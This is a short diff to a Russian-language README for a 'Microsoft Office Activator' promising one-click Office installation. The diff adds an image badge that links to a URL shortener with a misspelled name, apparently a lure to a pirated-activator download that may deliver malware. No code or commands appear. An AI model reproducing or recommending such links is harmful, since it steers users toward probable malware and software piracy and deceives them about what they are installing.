@@ -1,6 +1,8 @@
 # Microsoft Office Activator
 Используйте инструмент управления для внедрения пакета офисного программного обеспечения с помощью эффективного процесса в один клик.
 
+[![8467946812](https://github.com/user-attachments/assets/0ebecd47-1a15-4d6f-ac4e-41921c7952ac)](https://y.gy/microsoftt-office-activatorq)
+
 ## Инструмент управления конфигурацией Office
 
 ### Технический обзор
